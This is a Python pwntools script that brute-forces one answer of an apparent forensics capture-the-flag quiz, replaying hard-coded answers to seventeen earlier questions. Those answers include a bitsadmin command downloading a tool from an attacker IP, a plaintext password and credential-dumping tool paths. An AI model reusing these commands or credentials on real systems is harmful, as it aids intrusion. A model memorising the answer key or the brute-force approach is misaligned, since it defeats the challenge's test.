#!/usr/bin/env python3
from pwn import *
import sys
import time

context.log_level = 'error'

# Answers for Q1-Q17
answers_before = [
    "https://cybersharing.net/api/download/file/8bd5ce87-b1d2-45a8-be68-03bc664ab068/7f203a93-4619-40f8-93c4-e075eb4d39dd/ea62a809-a93b-4a89-bfe1-33247f5058f8/AnsiArtInstaller.exe_AnsiArtInstaller.exe_12/21/2025 11:14:31 PM",
    "12/21/2025 11:15:10 PM",
    "ansi_art.exe,program.banner",
    "C:\\Users\\Administrator\\AppData\\Local\\Temp",
    "C:\\Users\\Administrator\\Desktop\\AnsiArt.lnk",
    "192.168.100.157:443",
    "http://192.168.100.157:8082",
    "C:\\h1dd3n",
    "\"C:\\Windows\\system32\\bitsadmin.exe\" /Transfer jarangoyang /priority foreground http://192.168.100.157:8082/SDelete.zip C:\\h1dd3n\\sadewa.zip",
    "ipconfig",
    "as3ng_AsengCupu123!",
    "administrators,Remote Desktop Users",
    "12/22/2025 12:02 AM",
    "C:\\h1dd3n\\mimiperi.exe",
    "C:\\h1dd3n\\sassy.exe",
    "\\85985985-ddfa-430b-bf04-fc33fcfdc881\\pipe\\epmapper",
    "C:\\h1dd3n\\kucing.exe",
]

def log(msg):
    ts = time.strftime("%H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line, flush=True)
    with open('bruteforce_log.txt', 'a') as f:
        f.write(line + '\n')

def try_answer(candidate):
    """Try a specific answer for Q18"""
    try:
        r = remote('gzcli.ctf.cyberjawara.id', 60221, timeout=15)
        
        # Answer questions 1-17
        for ans in answers_before:
            r.recvuntil(b"Answer: ", timeout=15)
            r.sendline(ans.encode())
        
        # Now at Q18
        r.recvuntil(b"Answer: ", timeout=15)
        r.sendline(candidate.encode())
        
        # Check response
        response = r.recvline(timeout=10).decode().strip()
        r.close()
        
        return "Correct" in response, response
    except Exception as e:
        return None, str(e)

# Load candidates
with open('md5_priority.txt', 'r') as f:
    priority = [line.strip() for line in f if line.strip()]

with open('md5_candidates.txt', 'r') as f:
    all_candidates = [line.strip() for line in f if line.strip()]

priority_set = set(priority)
candidates = priority + [c for c in all_candidates if c not in priority_set]

# Clear log
with open('bruteforce_log.txt', 'w') as f:
    f.write('')

log(f"Loaded {len(priority)} priority + {len(candidates) - len(priority)} other = {len(candidates)} total")
log("Starting brute force...")

for i, candidate in enumerate(candidates):
    if i % 10 == 0:
        log(f"Progress: [{i+1}/{len(candidates)}] - Trying: {candidate}")
    
    result, response = try_answer(candidate)
    
    if result is True:
        log(f"FOUND! Answer: {candidate}")
        log(f"Response: {response}")
        with open('q18_answer.txt', 'w') as f:
            f.write(candidate)
        sys.exit(0)
    elif result is None:
        log(f"Error on {candidate}: {response} - retrying...")
        time.sleep(2)
        result, response = try_answer(candidate)
        if result is True:
            log(f"FOUND! Answer: {candidate}")
            log(f"Response: {response}")
            with open('q18_answer.txt', 'w') as f:
                f.write(candidate)
            sys.exit(0)

log("No correct answer found!")

